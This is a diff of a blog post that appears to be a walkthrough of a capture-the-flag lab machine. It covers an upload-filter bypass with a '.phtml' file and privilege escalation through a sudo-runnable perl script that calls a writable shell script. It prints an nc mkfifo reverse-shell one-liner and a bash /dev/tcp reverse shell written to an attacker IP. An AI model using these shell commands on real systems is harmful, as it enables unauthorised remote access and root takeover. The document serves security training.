@@ -98,82 +98,61 @@ Password: [cracked hashed password]
 ## Let's try to change the request from of our payload from '.php' to '.phtml' and forward the request
 ![img]({{ '/assets/images/lazyadmin/12-lazyadmin.png' | relative_url }}){: .center-image }
 
-We can see that this bypassed the filter and was succfully uploaded !
-
-
+## We can see that this bypassed the filter and was succfully uploaded !
 ![img]({{ '/assets/images/lazyadmin/13-lazyadmin.png' | relative_url }}){: .center-image }
+<br>
 
-Lets start our listner and navigate to the reverse shell we just uploaded by clicking the link on the page
-We now get a successful shell on our machine connecting to the target machine
+## Lets start our listner and navigate to the reverse shell we just uploaded
+## click the link on the page to run the rev shell
+## We now get a successful shell on our machine connecting to the target machine
+<br>
 
-
-Lets move into the /home directory and capture the user flag
-
-
-
+## Lets move into the /home directory and capture the user flag
 ![img]({{ '/assets/images/lazyadmin/14-lazyadmin.png' | relative_url }}){: .center-image }
+<br>
 
-> Flag: THM[redacted]
+## We now captured the User Flag !!!
+<br>
+<br>
+<br>
 
-
-_________________
-
-We now captured the User Flag !!!
-
-Lets try and escalate our privilege to get the root flag...
-
-
-
+## Lets try and escalate our privilege to get the root flag...
+<br>
+<br>
 {% highlight bash %}
 $ sudo -l 
 {% endhighlight bash %}
-
-
-Running the command above shows that itguy can run a perl script called 'backup.pl' as root
-We can inspect and see that it executes a bash script at '/etc/copy.sh'
-Inspecting this we see there is a  file which shows a script being run
-
-
+## Running the command above shows that itguy can run a perl script called 'backup.pl' as root
+## We can inspect and see that it executes a bash script at '/etc/copy.sh'
 ![img]({{ '/assets/images/lazyadmin/15-lazyadmin.png' | relative_url }}){: .center-image }
 
+## Inspecting this we see there is a  file which shows a script being run
 {% highlight bash %}
 $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 {% endhighlight bash %}
 
-
-
-
-Lets modify it to point to our IP and port of our listener 
-
-
+## Lets modify it to point to our IP and port of our listener 
 {% highlight bash %}
 $  echo "bash -i >& /dev/tcp/attacker_ip/port 0>&1" > copy.sh
 {% endhighlight bash %}
-
+{% highlight bash %}
 *Remember we are already connected on the port we chose for the first shell connection
 *So we will need to select a second listener and a different port from the first listener we set up
-
-
+{% endhighlight bash %}
 ![img]({{ '/assets/images/lazyadmin/16-lazyadmin.png' | relative_url }}){: .center-image }
 
-Lets run the command below to start the script
-
-
-
+## Lets run the command below to start the script
 {% highlight bash %}
 $ sudo /usr/bin/perl /home/itguy/backup.pl
 {% endhighlight bash %}
+<br>
 
-
-
-We now get our reverse shell as root on our machine!!!
-Lets cat out /root/root.txt to capture the ROOT FLAG
-
-
-
+## We now get our reverse shell as root on our machine!!!
+## Lets cat out /root/root.txt to capture the ROOT FLAG
 ![img]({{ '/assets/images/lazyadmin/17-lazyadmin.png' | relative_url }}){: .center-image }
+<br>
 
-We have now captured the root flag and pwnd the machine !
+## We have now captured the root flag and pwnd the machine !
 
 
 # LESSONS LEARNED:
